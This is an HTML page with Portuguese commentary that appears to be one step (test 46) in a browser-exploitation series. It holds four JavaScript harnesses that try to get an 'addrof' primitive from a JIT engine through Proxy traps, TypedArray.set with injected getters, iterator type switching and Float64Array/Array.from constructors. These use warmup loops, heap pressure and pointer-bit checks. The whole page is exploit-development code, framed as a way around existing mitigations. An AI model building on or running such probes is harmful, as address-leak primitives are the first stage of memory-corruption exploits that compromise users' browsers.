<!DOCTYPE html>
<html>
<head><meta charset="UTF-8"><title>TEST 46 — Técnicas Modernas de Addrof</title></head>
<body>
<h2>TEST 46 — Addrof: Técnicas Não Testadas</h2>
<p><b>Por que técnicas novas:</b> Mitigações clássicas bloqueiam JIT double-read e DataView OOB.<br>
Vetores alternativos exploram <em>diferentes caminhos de otimização</em> no mesmo motor.</p>
<ul>
  <li><b>46-A</b> <code>Proxy</code> como array — JIT inspeciona o target sem verificar trap</li>
  <li><b>46-B</b> <code>TypedArray.prototype.set(source)</code> com getter na source — leitura sequencial sem deopt</li>
  <li><b>46-C</b> <code>for...of</code> com <code>Symbol.iterator</code> customizado — muda tipo mid-loop</li>
  <li><b>46-D</b> <code>new Float64Array(iterable)</code> — construtor consume iterador; getter injeta objeto</li>
</ul>
<pre id="log">Pronto. Execute A → B → C → D.</pre>
<button onclick="runA()">46-A: PROXY TRAP</button>
<button onclick="runB()">46-B: TYPEDARRAY.SET GETTER</button>
<button onclick="runC()">46-C: ITERATOR CONFUSION</button>
<button onclick="runD()">46-D: CONSTRUCTOR ITERATION</button>

<script>
var log = document.getElementById('log');
function info(m)   { log.textContent += '\n[INFO] ' + m; }
function alerta(m) { log.textContent += '\n\n⚠ ALERTA: ' + m + '\n'; }
function ok(m)     { log.textContent += '\n[OK]   ' + m; }
function sep()     { log.textContent += '\n' + '-'.repeat(60); }

function forceGC() {
  var t=[]; for(var i=0;i<80000;i++) t.push({x:i,b:new Uint8Array(4)}); t=null;
}
function f64bits(val) {
  var buf=new ArrayBuffer(8); new Float64Array(buf)[0]=val;
  var u=new Uint32Array(buf);
  return '0x'+u[1].toString(16).padStart(8,'0')+'_'+u[0].toString(16).padStart(8,'0');
}
function isInterestingBits(val) {
  if(typeof val!=='number'||!isFinite(val)||isNaN(val)) return false;
  var buf=new ArrayBuffer(8); new Float64Array(buf)[0]=val;
  var u=new Uint32Array(buf);
  var hi=u[1],lo=u[0];
  if(hi===0x7ff80000&&lo===0) return false; // NaN canonico
  if(hi===0&&lo===0) return false;
  var exp=(hi>>>20)&0x7FF;
  if(exp>=0x3FE&&exp<=0x40F) return false; // doubles normais 0.5..32768
  return true;
}

// ─── 46-A ─────────────────────────────────────────────────────────────────
function runA() {
  log.textContent = '[TEST 46-A] Proxy como array — JIT inspeciona target sem verificar trap\n';
  sep();
  info('Técnica: criar um Proxy de um double array.');
  info('O JIT aquecido para double arrays pode acessar o [[Target]] do Proxy');
  info('sem passar pelo trap, especialmente em operações como indexação direta.\n');

  var victim = { magic: 0xDEADC0DE, tag: 'proxy_victim_46A' };

  // Target: double array puro
  var target = [1.1, 2.2, 3.3, 4.4, 5.5, 6.6, 7.7, 8.8];
  var trapLog = [];
  var phase = 'warmup';

  var handler = {
    get: function(t, prop, receiver) {
      if(phase === 'attack' && (prop === '3' || prop === '4')) {
        trapLog.push(prop);
        // Retornar o victim object quando o JIT pede o índice 3 ou 4
        return victim;
      }
      return t[prop];
    }
  };

  var proxy = new Proxy(target, handler);

  // Funções JIT — aquecer COM o Proxy (para especializar no Proxy)
  function readProxy3(p) { return p[3]; }
  function readProxy4(p) { return p[4]; }

  info('Aquecendo readProxy3/4 diretamente no Proxy (100k calls)...');
  phase = 'warmup';
  for(var w=0;w<100000;w++) {
    readProxy3(proxy);
    readProxy4(proxy);
  }
  info('Warmup completo. Traps durante warmup: ' + trapLog.length);
  trapLog = [];

  // Fase ataque: agora o Proxy retorna victim no trap
  phase = 'attack';
  info('\nFase ataque: trap retorna victim para índices 3 e 4...');

  var r3 = readProxy3(proxy);
  var r4 = readProxy4(proxy);

  info('readProxy3(proxy) = ' + r3 + ' | typeof=' + typeof r3);
  info('readProxy4(proxy) = ' + r4 + ' | typeof=' + typeof r4);
  info('Traps chamados durante ataque: [' + trapLog.join(',') + ']');

  if(typeof r3 === 'number') {
    info('bits r3: ' + f64bits(r3));
    if(isInterestingBits(r3)) {
      alerta('ADDROF VIA PROXY TRAP! readProxy3 retornou double suspeito:\n' +
             'bits=' + f64bits(r3) + '\nO JIT passou pelo trap mas retornou float64 do JSValue!');
    } else if(r3 === 4.4) {
      alerta('JIT IGNOROU O TRAP: retornou 4.4 (target[3] original)!\n' +
             'O JIT acessou o [[Target]] direto sem passar pelo handler!\n' +
             'trap chamados=' + trapLog.length + '\n' +
             'Isso é uma violação da semântica do Proxy — o motor bypassed o trap!');
    }
  } else if(typeof r3 === 'object') {
    info('Motor passou pelo trap corretamente. r3===victim: ' + (r3===victim));
    ok('Proxy trap funcionando. Tentar variante com Proxy não aquecido...');
  }

  sep();
  // Variante B: aquecer COM array normal, depois passar Proxy
  info('\nVariante: JIT aquecida em array normal, depois recebe Proxy...');
  var normalArr = [1.1, 2.2, 3.3, 4.4, 5.5, 6.6, 7.7, 8.8];
  function readNorm3(a) { return a[3]; }
  phase = 'warmup';
  for(var w2=0;w2<100000;w2++) readNorm3(normalArr);
  info('Warmup em normalArr completo.');

  // Agora passar o Proxy para função aquecida em array normal
  phase = 'attack';
  trapLog = [];
  try {
    var rp = readNorm3(proxy);
    info('readNorm3(proxy) = ' + rp + ' | typeof=' + typeof rp);
    info('Traps: [' + trapLog.join(',') + ']');
    if(typeof rp === 'number' && rp !== victim && isInterestingBits(rp)) {
      alerta('BYPASS DO PROXY TRAP!\nbits=' + f64bits(rp));
    } else if(typeof rp === 'number' && rp === 4.4) {
      alerta('JIT IGNOROU PROXY TRAP: retornou 4.4 (valor do target, não do trap)!\n' +
             'O motor acessou target[3] diretamente bypassando o handler!\n' +
             'traps chamados: ' + trapLog.length);
    } else if(typeof rp === 'object') {
      ok('Trap chamado corretamente para função aquecida em normalArr. rp===victim: ' + (rp===victim));
    }
  } catch(e) {
    alerta('EXCECAO em readNorm3(proxy): ' + e.message);
  }

  sep();
  // Variante C: Proxy com trap que MUDA o target durante o acesso
  info('\nVariante C: trap muda target[3] para objeto durante acesso...');
  var target2 = [10.0, 20.0, 30.0, 40.0, 50.0];
  var trapFired = false;
  var handler2 = {
    get: function(t, prop) {
      if(prop === '2' && !trapFired) {
        trapFired = true;
        t[3] = victim; // muda target diretamente
        forceGC();
        info('Trap[2]: target[3] = victim (modificado no target)');
      }
      return t[prop];
    }
  };
  var proxy2 = new Proxy(target2, handler2);

  function readSequential(p) {
    // Acessa sequencialmente — lê [2] (dispara trap), depois [3]
    var a = p[0], b = p[1], c = p[2]; // c dispara o trap
    return p[3]; // target[3] agora é victim
  }

  phase = 'warmup';
  var target2warm = [10.0, 20.0, 30.0, 40.0, 50.0];
  var proxy2warm = new Proxy(target2warm, { get: function(t,p){ return t[p]; } });
  for(var w3=0;w3<100000;w3++) readSequential(proxy2warm);
  info('Warmup em proxy sem trap completo.');

  phase = 'attack';
  try {
    var rs = readSequential(proxy2);
    info('readSequential(proxy2) = ' + rs + ' | typeof=' + typeof rs);
    if(typeof rs === 'number') {
      info('bits: ' + f64bits(rs));
      if(isInterestingBits(rs)) alerta('ADDROF: bits=' + f64bits(rs));
      else info('Valor não parece ponteiro.');
    } else if(typeof rs === 'object') {
      ok('Motor retornou objeto via proxy2. rs===victim: ' + (rs===victim));
    }
  } catch(e) { alerta('EXCECAO readSequential: ' + e.message); }
}

// ─── 46-B ─────────────────────────────────────────────────────────────────
function runB() {
  log.textContent = '[TEST 46-B] TypedArray.prototype.set(source) com getter na source\n';
  sep();
  info('Técnica nova: TypedArray.set(source) lê source sequencialmente.');
  info('Diferente de slice(): set() ESCREVE em TypedArray existente (destino fixo).');
  info('Se source tem getter que muda source[N] para objeto durante set(),');
  info('o JIT pode ter lido source[N] como double antes de perceber o tipo.\n');
  info('O resultado: f64dest[N] contém os bits do JSValue de victim!\n');

  var victim = { magic: 0xBEEFC0DE, secret: new Float64Array([3.14, 2.72, 1.41]) };
  var f64dest = new Float64Array(8); // destino fixo

  // Source com getter
  var source = [1.1, 2.2, 0.0, 0.0, 5.5, 6.6, 7.7, 8.8];
  var triggered = false;
  Object.defineProperty(source, 2, {
    get: function() {
      if(!triggered) {
        triggered = true;
        source[3] = victim; // injetar objeto em [3]
        forceGC();
        info('Getter[2]: source[3] = victim');
      }
      return 3.3; // retornar double para manter butterfly
    },
    configurable: true, enumerable: true
  });

  info('f64dest antes: [' + Array.from(f64dest).join(', ') + ']');
  info('Chamando f64dest.set(source)...');

  try {
    f64dest.set(source);
    info('f64dest após set: [' + Array.from(f64dest).map(function(v){
      return v + '(' + f64bits(v) + ')';
    }).join(', ') + ']');

    // Verificar cada slot por bits de ponteiro
    for(var i=0;i<8;i++) {
      var v = f64dest[i];
      if(isInterestingBits(v)) {
        alerta('ADDROF via TypedArray.set()!\n' +
               'f64dest[' + i + '] = ' + v + '\n' +
               'bits: ' + f64bits(v) + '\n' +
               'set() leu source[' + i + '] como double enquanto era objeto (victim)!\n' +
               'Este double contém os bits do JSValue de victim → addrof confirmado!');
      } else if(v !== 0 && v !== 1.1 && v !== 2.2 && v !== 3.3) {
        info('f64dest[' + i + '] = ' + v + ' bits=' + f64bits(v) + ' ← valor inesperado');
      }
    }

    // Verificar especialmente [3] — onde o victim foi injetado
    info('\nFoco em f64dest[3] (onde victim foi injetado):');
    info('f64dest[3] = ' + f64dest[3] + ' bits=' + f64bits(f64dest[3]));
    if(f64dest[3] === 0) {
      info('Retornou 0 — set() usou ToNumber(victim) = NaN → 0 no Float64Array (correto)');
    }
  } catch(e) {
    alerta('EXCECAO em f64dest.set(source): ' + e.message);
  }

  sep();
  // Variante: Uint32Array.set() — em Uint32 o NaN fica diferente
  info('\nVariante: Uint32Array.set(source) — victim fica como ToUint32...');
  var u32dest = new Uint32Array(8);
  var source2 = [10, 20, 0, 0, 50, 60, 70, 80];
  var triggered2 = false;
  Object.defineProperty(source2, 2, {
    get: function() {
      if(!triggered2) { triggered2=true; source2[3]=victim; forceGC(); }
      return 30;
    },
    configurable: true, enumerable: true
  });

  try {
    u32dest.set(source2);
    info('u32dest[3] = 0x' + u32dest[3].toString(16));
    if(u32dest[3] !== 0 && u32dest[3] !== 0xDEADC0DE) {
      alerta('Uint32Array.set()[3] = 0x' + u32dest[3].toString(16) + '\n' +
             'Valor inesperado — pode ser ToUint32 do ponteiro de victim!');
    }
  } catch(e) { info('Uint32Array.set() lançou: ' + e.message); }
}

// ─── 46-C ─────────────────────────────────────────────────────────────────
function runC() {
  log.textContent = '[TEST 46-C] for...of com Symbol.iterator customizado — muda tipo mid-loop\n';
  sep();
  info('Técnica: iterable com Symbol.iterator que começa retornando doubles');
  info('mas muda para retornar {value: victim, done: false} depois de N iterações.');
  info('O JIT aquecido para loop de doubles pode não reverificar o tipo do .value.\n');

  var victim = { magic: 0xFACEFACE, data: new Uint8Array(16) };
  var iterCount = 0;
  var phase = 'warmup';
  var SWITCH_AT = 3; // mudar para objeto na iteração 3

  function makeIterable(phase_ref) {
    return {
      [Symbol.iterator]: function() {
        var idx = 0;
        var vals = [1.1, 2.2, 3.3, 4.4, 5.5];
        return {
          next: function() {
            if(idx >= vals.length) return { value: undefined, done: true };
            var i = idx++;
            if(phase_ref[0] === 'attack' && i === SWITCH_AT) {
              // Retornar o victim como value
              return { value: victim, done: false };
            }
            return { value: vals[i], done: false };
          }
        };
      }
    };
  }

  var phaseRef = ['warmup'];

  // Função JIT que faz for...of e coleta resultados em Float64Array
  function collectIntoF64(iterable) {
    var result = new Float64Array(8);
    var i = 0;
    for(var v of iterable) {
      if(i < 8) result[i++] = v;
    }
    return result;
  }

  // Variante que coleta em array JS
  function collectIntoArr(iterable) {
    var result = [];
    for(var v of iterable) result.push(v);
    return result;
  }

  info('Aquecendo collectIntoF64 (50k calls)...');
  phaseRef[0] = 'warmup';
  var warmIter = makeIterable(phaseRef);
  for(var w=0;w<50000;w++) collectIntoF64(makeIterable(phaseRef));
  info('Warmup completo.');
  sep();

  phaseRef[0] = 'attack';
  info('Fase ataque: iterador retorna victim na posição ' + SWITCH_AT + '...');

  // Test 1: Float64Array — o JIT escreve em float64 o JSValue de victim?
  var f64result = collectIntoF64(makeIterable(phaseRef));
  info('\nFloat64Array resultado:');
  for(var i=0;i<8;i++) {
    if(f64result[i] !== 0) {
      var b = f64bits(f64result[i]);
      info('  result['+i+']: ' + f64result[i] + ' bits=' + b);
      if(i === SWITCH_AT && isInterestingBits(f64result[i])) {
        alerta('ADDROF via for...of Float64Array!\n' +
               'result['+SWITCH_AT+'] = ' + f64result[SWITCH_AT] + '\n' +
               'bits: ' + b + '\n' +
               'O for...of escreveu JSValue de victim como float64!');
      }
    }
  }

  // Test 2: Array JS — o JIT mantém o objeto?
  phaseRef[0] = 'attack';
  var arrResult = collectIntoArr(makeIterable(phaseRef));
  info('\nArray JS resultado:');
  for(var i=0;i<arrResult.length;i++) {
    info('  result['+i+']: ' + arrResult[i] + ' typeof=' + typeof arrResult[i]);
    if(i === SWITCH_AT) {
      if(typeof arrResult[i] === 'object') {
        ok('for...of preservou objeto em array JS. result['+i+']===victim: '+(arrResult[i]===victim));
      } else if(typeof arrResult[i] === 'number') {
        alerta('for...of CONVERTEU objeto para number em Array JS!\n' +
               'result['+i+'] = ' + arrResult[i] + ' bits=' + f64bits(arrResult[i]));
      }
    }
  }

  sep();
  // Variante D: spread operator — [...iterable]
  info('\nVariante: spread [...iterable] com objeto na posição ' + SWITCH_AT + '...');
  phaseRef[0] = 'attack';

  function spreadIntoF64(iter) {
    var arr = [...iter]; // spread
    if(arr.length > SWITCH_AT && typeof arr[SWITCH_AT] === 'number') {
      return arr[SWITCH_AT]; // retornar o valor na posição de interesse
    }
    return arr[SWITCH_AT]; // retornar qualquer coisa
  }

  // Warmup do spread
  phaseRef[0] = 'warmup';
  for(var w2=0;w2<50000;w2++) spreadIntoF64(makeIterable(phaseRef));

  phaseRef[0] = 'attack';
  var spreadResult = spreadIntoF64(makeIterable(phaseRef));
  info('spread['+SWITCH_AT+']: ' + spreadResult + ' typeof=' + typeof spreadResult);
  if(typeof spreadResult === 'number' && isInterestingBits(spreadResult)) {
    alerta('ADDROF via spread: ' + f64bits(spreadResult));
  } else if(typeof spreadResult === 'object') {
    ok('Spread preservou objeto. ===victim: ' + (spreadResult===victim));
  }
}

// ─── 46-D ─────────────────────────────────────────────────────────────────
function runD() {
  log.textContent = '[TEST 46-D] new Float64Array(iterable) — construtor consume iterador com getter\n';
  sep();
  info('Técnica: o construtor Float64Array(iterable) chama next() sequencialmente.');
  info('Cada .value é convertido para float64 via ToNumber() normalmente.');
  info('Mas se o iterador retornar um objeto cujo valueOf() é instrumentado,');
  info('e o JIT assumiu que todos os valores são primitivos...\n');
  info('Variante crítica: o iterador retorna um objeto com valueOf que tem');
  info('um SIDE EFFECT que muda o estado do heap durante a conversão.\n');

  var victim = { magic: 0xC0DEC0DE, secret: 42 };
  var phase = ['warmup'];
  var conversionLog = [];

  // Objeto que loga quando valueOf é chamado (para ver quantas conversões ocorrem)
  function makeValueOfProxy(realVal, victimRef) {
    return {
      valueOf: function() {
        conversionLog.push(realVal);
        return realVal;
      },
      [Symbol.toPrimitive]: function(hint) {
        conversionLog.push('toPrimitive:'+hint+':'+realVal);
        return realVal;
      }
    };
  }

  // Iterable que retorna objetos com valueOf normais no warmup
  // e no ataque retorna um objeto especial na posição 3
  var attackObj = {
    valueOf: function() {
      // Este é chamado pelo construtor Float64Array para converter para number
      // Se o JIT inline esta chamada e tiver specializado para o valor anterior...
      conversionLog.push('ATTACK_valueOf');
      // Tentar: retornar um valor que quando interpretado como bits do JSValue
      // vaza informação. Mas primeiro: verificar se valueOf é chamado.
      return victim; // retornar o victim object de volta (não um número)
    }
  };

  function makeAttackIterable(ph) {
    return {
      [Symbol.iterator]: function() {
        var i = 0;
        var vals = ph[0] === 'warmup'
          ? [1.1, 2.2, 3.3, 4.4, 5.5]
          : [1.1, 2.2, 3.3, attackObj, 5.5]; // posição 3 = attackObj
        return { next: function() {
          if(i>=vals.length) return {value:undefined,done:true};
          return {value:vals[i++],done:false};
        }};
      }
    };
  }

  // Warmup: construir Float64Array a partir de iterable normal
  info('Aquecendo new Float64Array(iterable) (50k calls)...');
  phase[0] = 'warmup';
  var warmCount = 0;
  for(var w=0;w<50000;w++) {
    var f = new Float64Array(makeAttackIterable(phase));
    warmCount++;
  }
  info('Warmup: ' + warmCount + ' Float64Arrays criados.');
  sep();

  // Fase ataque: posição 3 é attackObj (cujo valueOf retorna victim object)
  phase[0] = 'attack';
  conversionLog = [];
  info('Fase ataque: posição 3 = objeto cujo valueOf retorna victim...');

  try {
    var attackF64 = new Float64Array(makeAttackIterable(phase));
    info('Float64Array criado. length=' + attackF64.length);
    info('conversionLog: [' + conversionLog.slice(0,10).join(', ') + ']');
    info('attackF64[3] = ' + attackF64[3] + ' bits=' + f64bits(attackF64[3]));

    if(attackF64[3] === 0 || isNaN(attackF64[3])) {
      info('attackF64[3]=0 ou NaN — ToNumber(victim) = NaN → 0 no Float64Array (normal)');
    } else if(isInterestingBits(attackF64[3])) {
      alerta('ADDROF via Float64Array constructor!\n' +
             'attackF64[3] = ' + attackF64[3] + ' bits=' + f64bits(attackF64[3]));
    }
  } catch(e) {
    alerta('EXCECAO no construtor Float64Array: ' + e.message);
  }

  sep();
  // Variante MAIS PROMISSORA: Array.from() com mapFn que recebe objeto
  info('\nVariante PRINCIPAL: Array.from(doubleArr, mapFn) com getter que muda tipo...');
  info('Array.from chama mapFn(element, index). Se element muda de double para objeto');
  info('entre a leitura do element e a chamada do mapFn, o JIT pode ter types errados.\n');

  var victim2 = { magic: 0xBEEFBEEF, ptr: new Uint32Array(4) };
  var arr_from = [1.1, 2.2, 3.3, 4.4, 5.5];
  var triggered_from = false;

  // Getter no índice 2 que muda arr_from[3] para objeto
  Object.defineProperty(arr_from, 2, {
    get: function() {
      if(!triggered_from) {
        triggered_from = true;
        arr_from[3] = victim2;
        forceGC();
        info('Getter[2] em Array.from: arr_from[3] = victim2');
      }
      return 3.3;
    },
    configurable: true, enumerable: true
  });

  // mapFn que apenas retorna o elemento — JIT especializa para double→double
  var cleanArr = [10.0, 20.0, 30.0, 40.0, 50.0];
  function identity(v) { return v; }

  info('Aquecendo Array.from(cleanArr, identity) (50k calls)...');
  for(var w2=0;w2<50000;w2++) Array.from(cleanArr, identity);
  info('Warmup completo.');

  // Ataque: usar arr_from (com getter que injeta objeto)
  var fromResult = Array.from(arr_from, identity);
  info('Array.from(arr_from, identity):');
  for(var i=0;i<fromResult.length;i++) {
    var v = fromResult[i];
    info('  ['+i+']: ' + v + ' typeof=' + typeof v);
    if(i===3) {
      if(typeof v === 'number') {
        info('  bits: ' + f64bits(v));
        if(isInterestingBits(v)) {
          alerta('ADDROF via Array.from mapFn!\n' +
                 'fromResult[3] = ' + v + ' bits=' + f64bits(v) + '\n' +
                 'mapFn recebeu victim2 mas retornou double com bits suspeitos!');
        }
      } else if(typeof v === 'object') {
        info('  ===victim2: ' + (v===victim2));
        ok('Array.from preservou o objeto corretamente.');
      }
    }
  }

  // ÚLTIMO RECURSO: Array.prototype.map com TypedArray destino
  sep();
  info('\nÚltimo recurso: Float64Array.from(jsArray) onde jsArray[3] é objeto...');
  var jsArr = [1.1, 2.2, 3.3, null, 5.5]; // [3] será objeto
  jsArr[3] = victim2; // colocar objeto diretamente
  info('jsArr[3] = victim2 (typeof=object)');

  try {
    var tf64 = Float64Array.from(jsArr);
    info('Float64Array.from(jsArr)[3] = ' + tf64[3] + ' bits=' + f64bits(tf64[3]));
    if(isInterestingBits(tf64[3])) {
      alerta('ADDROF via Float64Array.from!\n' +
             'tf64[3] = ' + tf64[3] + ' bits=' + f64bits(tf64[3]));
    } else {
      info('Valor: ' + tf64[3] + ' (ToNumber(victim2)=NaN→' + tf64[3] + ')');
    }
  } catch(e) { info('Float64Array.from lançou: ' + e.message); }
}
</script>
</body>
</html>

